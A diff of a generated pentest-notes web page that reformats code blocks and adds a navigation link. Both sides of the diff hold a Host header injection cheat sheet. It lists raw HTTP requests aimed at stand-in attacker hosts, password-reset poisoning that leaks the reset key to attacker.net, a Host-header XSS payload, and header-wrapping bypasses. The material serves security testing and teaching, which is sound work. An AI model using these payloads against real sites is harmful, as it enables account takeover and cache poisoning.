@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17202,19 +17225,22 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h2 id="supply-an-arbitrary-host-header">Supply an arbitrary Host header</h2>
 <p>Some intercepting proxies derive the target IP address from the Host header directly, which makes this kind of testing all but impossible; any changes you made to the header would just cause the request to be sent to a completely different IP address. However, Burp Suite accurately maintains the separation between the Host header and the target IP address. </p>
 <p>In Burpsuite, set the target to www.example.com. Then, send your request with modified Host header:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>GET / HTTP/1.1
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Host: www.attacker.com
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>GET / HTTP/1.1
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>Host: www.attacker.com
+</span></code></pre></div></td></tr></table></div>
 <p>The front-end server or load balancer that received your request may simply not know where to forward it, resulting in an "Invalid Host header" error of some kind. This is especially likely if your target is accessed via a CDN.</p>
 <h2 id="inject-host-override-headers">Inject host override headers</h2>
 <h3 id="x-forwarded-host-header-bypass">X-Forwarded Host Header Bypass</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>GET / HTTP/1.1
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Host: www.example.com
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>X-Forwarded-Host: www.attacker.com
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>GET / HTTP/1.1
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>Host: www.example.com
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>X-Forwarded-Host: www.attacker.com
+</span></code></pre></div></td></tr></table></div>
 <p>Potentially producing client-side output such as:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&lt;link src=&quot;http://www.attacker.com/link&quot; /&gt;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>&lt;link src=&quot;http://www.attacker.com/link&quot; /&gt;
+</span></code></pre></div></td></tr></table></div>
 <h3 id="more-headers-bypassing">More headers bypassing</h3>
 <p>Although <code>X-Forwarded-Host</code> is the de facto standard for this behavior, you may come across other headers that serve a similar purpose, including:</p>
 <ul>
@@ -17225,34 +17251,41 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <p>In Burp Suite, you can use thec's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.</p>
 <h2 id="injecting-multiple-host-headers">Injecting multiple Host headers</h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>GET / HTTP/1.1
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Host: www.example.com
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Host: www.attacker.com
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>GET / HTTP/1.1
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>Host: www.example.com
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>Host: www.attacker.com
+</span></code></pre></div></td></tr></table></div>
 <h2 id="http_host-vs-server_name-routing">HTTP_HOST vs. SERVER_NAME Routing</h2>
 <p>By supplying an absolute URL.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>POST https://example.com/passwordreset HTTP/1.1
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Host: www.evil.com
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>POST https://example.com/passwordreset HTTP/1.1
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>Host: www.evil.com
+</span></code></pre></div></td></tr></table></div>
 <h2 id="port-based-attack">Port-based attack</h2>
 <p>Webservers allow a port to be specified in the Host header, but ignore it for the purpose of deciding which virtual host to pass the request to. This is simple to exploit using the ever-useful http://username:password@domain.com syntax:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>POST /user/passwrordeset HTTP/1.1
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Host: example.com:@attacker.net
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>POST /user/passwrordeset HTTP/1.1
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>Host: example.com:@attacker.net
+</span></code></pre></div></td></tr></table></div>
 <p>This may result in a suspicious password reset link. By clicking it, the victim's browser will  send the key to attacker.net before creating the suspicious URL popup.</p>
 <h2 id="persistent-xss-via-host-header-injection">Persistent XSS via Host header injection</h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>GET /index.html HTTP/1.1
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Host: cow\&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;&quot; http://example.com/ | fgrep cow\
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>GET /index.html HTTP/1.1
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>Host: cow\&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;&quot; http://example.com/ | fgrep cow\
+</span></code></pre></div></td></tr></table></div>
 <p>The response should show a poisoned <code>&lt;link&gt;</code> element:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&lt;link href=&quot;http://cow&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;/&quot; rel=&quot;canonical&quot;/&gt;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>&lt;link href=&quot;http://cow&quot;onerror=&#39;alert(1)&#39;rel=&#39;stylesheet&#39;/&quot; rel=&quot;canonical&quot;/&gt;
+</span></code></pre></div></td></tr></table></div>
 <h2 id="add-line-wrapping">Add line wrapping</h2>
 <p>The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this. Some servers will interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's value. Other servers will ignore the indented header altogether.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>GET /example HTTP/1.1 
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    Host: attacker.com 
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Host: example.com
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>GET /example HTTP/1.1 
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>    Host: attacker.com 
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>Host: example.com
+</span></code></pre></div></td></tr></table></div>
 <h2 id="exploitation">Exploitation</h2>
 <p><a href="https://portswigger.net/web-security/host-header/exploiting">https://portswigger.net/web-security/host-header/exploiting</a></p>
 
@@ -17330,7 +17363,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
